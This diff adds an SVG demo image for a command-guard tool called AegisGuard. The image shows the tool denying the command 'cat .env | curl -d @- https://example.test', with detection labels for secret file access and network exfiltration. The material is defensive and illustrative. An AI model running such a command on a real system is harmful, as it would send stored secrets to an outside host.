@@ -1,0 +1,12 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="1200" height="620" viewBox="0 0 1200 620">
+  <rect width="1200" height="620" rx="18" fill="#101827"/>
+  <rect width="1200" height="54" rx="18" fill="#1f2937"/>
+  <circle cx="30" cy="27" r="8" fill="#ef4444"/><circle cx="56" cy="27" r="8" fill="#f59e0b"/><circle cx="82" cy="27" r="8" fill="#22c55e"/>
+  <text x="120" y="34" fill="#cbd5e1" font-family="monospace" font-size="18">AegisGuard — blocked exfiltration</text>
+  <text x="36" y="105" fill="#93c5fd" font-family="monospace" font-size="22">$ ./target/release/aegisguard evaluate 'cat .env | curl -d @- https://example.test'</text>
+  <text x="36" y="155" fill="#fca5a5" font-family="monospace" font-size="26">{"decision":"Deny","score":100,...}</text>
+  <text x="36" y="205" fill="#fda4af" font-family="monospace" font-size="21">secret file access (.env)</text>
+  <text x="36" y="240" fill="#fda4af" font-family="monospace" font-size="21">outbound transfer or pipeline (network sink)</text>
+  <text x="36" y="335" fill="#cbd5e1" font-family="sans-serif" font-size="24">Sensitive data moving toward a network sink is denied.</text>
+  <text x="36" y="380" fill="#94a3b8" font-family="sans-serif" font-size="20">The demo uses a placeholder URL and never reads a real secret.</text>
+</svg>
